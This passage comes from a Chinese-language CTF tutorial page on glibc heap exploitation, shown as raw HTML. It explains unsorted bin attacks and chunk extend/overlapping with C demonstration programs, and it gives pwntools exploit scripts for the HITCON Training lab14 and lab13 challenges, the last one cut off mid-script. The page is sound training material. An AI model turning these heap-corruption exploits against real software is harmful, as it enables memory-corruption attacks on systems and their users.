keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//------------------------------------</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//create chunk</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"[%p]: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>target_var<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结果</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mark@mark-virtual-machine:~/Desktop$ ./test The data on stack <span class="token punctuation">[</span>0x7ffd5a39cc98<span class="token punctuation">]</span>: <span class="token number">0</span>A chunk on the heap at: 0x1503010Free p p<span class="token string">'s bk == 0x7f0cd80cdb78And now chunk'</span>s bk <span class="token operator">==</span> 0x7ffd5a39cc88<span class="token punctuation">[</span>0x7ffd5a39cc98<span class="token punctuation">]</span>: 0x7f0cd80cdb78<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>分析</strong></p><p><img src="https://pic.imgdb.cn/item/60a1e7796ae4f77d35e7b830.png"></p><p>这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。<strong>作用：</strong></p><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>可以修改 heap 中的 global_max_fast（一般在libc中）来使得更大的 chunk 可以被视为 fast bin，这样就可以去执行一些 fast bin attack 了。</li></ul><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><h3 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h3><p>这题可以利用unsortedbinAttack将magic修改为较大值，也可以直接fastbinAttack具体修改magic的值，提供两种exp</p><p>FastbinAttack</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Fastbin Attck</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./magicheap"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Heap :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'heap:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size of Heap : "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content of heap :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token comment">#idx == 0</span>create<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token comment">#idx == 1</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#bins->[1]</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">'\x71'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6020AD</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#[SIZE] 0x6020B5</span><span class="token comment">#bins->[1]->.bss[0x6020bd]</span><span class="token comment">#   magic[0x6020c0]</span><span class="token comment">#gdb.attach(p)</span>create<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">666666</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#edit the magic</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4869</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Unsortedbin Attack</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Unsortedbin Attack</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./magicheap"</span><span class="token punctuation">)</span><span class="token comment">#p = remote("node3.buuoj.cn","25462")</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Heap :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'heap:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size of Heap : "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content of heap :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token comment">#idx==0</span>create<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token comment">#idx==1</span>create<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token comment">#idx==2</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#bins->[1]</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">,</span><span class="token string">'\x11'</span><span class="token operator">*</span><span class="token number">0x130</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">'\x41'</span><span class="token operator">+</span><span class="token string">'\x01'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6020b0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#bins->[1]->[.bss]</span>create<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4869</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Largebin-Attack"><a href="#Largebin-Attack" class="headerlink" title="Largebin Attack"></a>Largebin Attack</h1><p>看不懂，学不明白，，，，，</p><p>[ 待完善 ]</p><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>由ptmalloc的宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><p>假设存在⼀个 off-by-one 漏洞，我们目的是构造overlap chunk，则<strong>构造过程</strong>应该为：</p><p><strong>步骤1：</strong>申请三个堆块A、B、C，假定它们的size分别为sizeA、sizeB、sizeC，向A中写入数据覆盖到B中的size域，将B的size改为sizeB+sizeC。</p><p><strong>步骤2：</strong>把B块free掉，此时根据B块的size去找下⼀块chunk的header进行inused bit检查，这里C块是被使用的，所以可以通过检查，通过检查后，free掉的堆块会根据sizeB+sizeC的大小放到bins里面。</p><p><strong>步骤3：</strong>把C块也free掉，然后malloc(sizeB+sizeC)，将刚刚被放到bins里面的chunk分配出来,这个时候C这个chunk还是在bins上面的，通过刚刚分配的chunk就可以控制chunk C的fd指针，从而实现任意地址写。</p><p><strong>即：可以利用 off by one 漏洞修改chunk的fd等chunk header</strong></p><h2 id="原理示例"><a href="#原理示例" class="headerlink" title="原理示例"></a>原理示例</h2><h3 id="Fastbin-inuse-Extend"><a href="#Fastbin-inuse-Extend" class="headerlink" title="Fastbin(inuse) Extend"></a>Fastbin(inuse) Extend</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配第一个0x10的chunk</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配第二个0x10的chunk</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>ptr<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0x41</span><span class="token punctuation">;</span><span class="token comment">// 修改第一个块的size域</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        ptr1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 实现 extend，控制了第二个块的内容</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Smallbin-inuse-Extend"><a href="#Smallbin-inuse-Extend" class="headerlink" title="Smallbin(inuse) Extend"></a>Smallbin(inuse) Extend</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配第一个 0x80 的chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//分配第二个 0x10 的chunk2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//防止与top chunk合并</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ptr<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0xb1</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//控制chunk2</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Smallbin-free-Extend"><a href="#Smallbin-free-Extend" class="headerlink" title="Smallbin(free) Extend"></a>Smallbin(free) Extend</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配第一个0x80的chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配第二个0x10的chunk2</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//首先进行释放，使得chunk1进入unsorted bin</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ptr<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0xb1</span><span class="token punctuation">;</span>    ptr1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//控制chunk2</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="extend-后向-overlapping"><a href="#extend-后向-overlapping" class="headerlink" title="extend 后向 overlapping"></a>extend 后向 overlapping</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分配第1个 0x80 的chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//分配第2个 0x10 的chunk2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//分配第3个 0x10 的chunk3</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//分配第4个 0x10 的chunk4    </span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ptr<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0x61</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><h3 id="extend-前向-overlapping"><a href="#extend-前向-overlapping" class="headerlink" title="extend 前向 overlapping"></a>extend 前向 overlapping</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span><span class="token operator">*</span>ptr2<span class="token punctuation">,</span><span class="token operator">*</span>ptr3<span class="token punctuation">,</span><span class="token operator">*</span>ptr4<span class="token punctuation">;</span>    ptr1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//smallbin1</span>    ptr2<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fastbin1</span>    ptr3<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fastbin2</span>    ptr4<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//smallbin2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//防止与top合并</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>ptr4<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">;</span><span class="token comment">//修改pre_inuse域</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>ptr4<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0xd0</span><span class="token punctuation">;</span><span class="token comment">//修改pre_size域</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unlink进行前向extend</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//占位块</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><h3 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./heapcreator"</span><span class="token punctuation">)</span><span class="token comment">#p = remote("node3.buuoj.cn","25462")</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Heap :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'heap:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content of heap :"</span><span class="token punctuation">)</span>p<span class="token 